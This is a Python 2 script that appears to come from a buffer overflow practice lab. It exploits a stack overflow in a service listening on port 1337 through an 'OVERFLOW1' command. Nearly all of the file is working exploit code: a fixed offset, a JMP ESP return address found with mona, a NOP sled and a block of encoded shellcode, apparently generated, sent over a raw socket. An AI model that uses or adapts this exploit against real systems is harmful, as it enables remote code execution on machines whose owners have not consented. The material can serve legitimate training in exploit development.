#!/usr/bin/env python2
import socket

RHOST="10.10.160.66"
RPORT=1337

badchar_test = ""
badchars = [0x00, 0x0A, 0x07, 0x08, 0x2e, 0x2f, 0xa0, 0xa1] #know in advance because of string input


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#find gardget locations
#!mona jmp -r esp -cpb "\x00\x0A"
#080414c3,080416bf
addr_jmp_esp=0x625011af
import struct
addr_jmp_esp_LE=struct.pack("<I",addr_jmp_esp)
buf_totlen=3000
offset=1988

buf="OVERFLOW1 "
buf+="A"*(offset - len(buf)) #probably not necessary to sub 0?
buf+= addr_jmp_esp_LE

buf +=  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x65\xd7\x89\x1f\x83\xee\xfc\xe2\xf4\x99\x3f"
buf += b"\x0b\x1f\x65\xd7\xe9\x96\x80\xe6\x49\x7b\xee\x87\xb9"
buf += b"\x94\x37\xdb\x02\x4d\x71\x5c\xfb\x37\x6a\x60\xc3\x39"
buf += b"\x54\x28\x25\x23\x04\xab\x8b\x33\x45\x16\x46\x12\x64"
buf += b"\x10\x6b\xed\x37\x80\x02\x4d\x75\x5c\xc3\x23\xee\x9b"
buf += b"\x98\x67\x86\x9f\x88\xce\x34\x5c\xd0\x3f\x64\x04\x02"
buf += b"\x56\x7d\x34\xb3\x56\xee\xe3\x02\x1e\xb3\xe6\x76\xb3"
buf += b"\xa4\x18\x84\x1e\xa2\xef\x69\x6a\x93\xd4\xf4\xe7\x5e"
buf += b"\xaa\xad\x6a\x81\x8f\x02\x47\x41\xd6\x5a\x79\xee\xdb"
buf += b"\xc2\x94\x3d\xcb\x88\xcc\xee\xd3\x02\x1e\xb5\x5e\xcd"
buf += b"\x3b\x41\x8c\xd2\x7e\x3c\x8d\xd8\xe0\x85\x88\xd6\x45"
buf += b"\xee\xc5\x62\x92\x38\xbf\xba\x2d\x65\xd7\xe1\x68\x16"
buf += b"\xe5\xd6\x4b\x0d\x9b\xfe\x39\x62\x28\x5c\xa7\xf5\xd6"
buf += b"\x89\x1f\x4c\x13\xdd\x4f\x0d\xfe\x09\x74\x65\x28\x5c"
buf += b"\x4f\x35\x87\xd9\x5f\x35\x97\xd9\x77\x8f\xd8\x56\xff"
buf += b"\x9a\x02\x1e\x75\x60\xbf\x83\x19\x4f\x3c\xe1\x1d\x65"
buf += b"\xd3\x5b\x96\x83\xbd\x99\x49\x32\xbf\x10\xba\x11\xb6"
buf += b"\x76\xca\xe0\x17\xfd\x13\x9a\x99\x81\x6a\x89\xbf\x79"
buf += b"\xaa\xc7\x81\x76\xca\x0d\xb4\xe4\x7b\x65\x5e\x6a\x48"
buf += b"\x32\x80\xb8\xe9\x0f\xc5\xd0\x49\x87\x2a\xef\xd8\x21"
buf += b"\xf3\xb5\x1e\x64\x5a\xcd\x3b\x75\x11\x89\x5b\x31\x87"
buf += b"\xdf\x49\x33\x91\xdf\x51\x33\x81\xda\x49\x0d\xae\x45"
buf += b"\x20\xe3\x28\x5c\x96\x85\x99\xdf\x59\x9a\xe7\xe1\x17"
buf += b"\xe2\xca\xe9\xe0\xb0\x6c\x69\x02\x4f\xdd\xe1\xb9\xf0"
buf += b"\x6a\x14\xe0\xb0\xeb\x8f\x63\x6f\x57\x72\xff\x10\xd2"
buf += b"\x32\x58\x76\xa5\xe6\x75\x65\x84\x76\xca"

buf+= "D"*(buf_totlen - len(buf)) # keep size the same
buf+="\n"

s.send(buf)

print("Send: {0}".format(buf))

data=s.recv(1024)
print("Received: {}".format(data))

#!mona compare -a esp -f c:\badchartest.bin
#to compare them
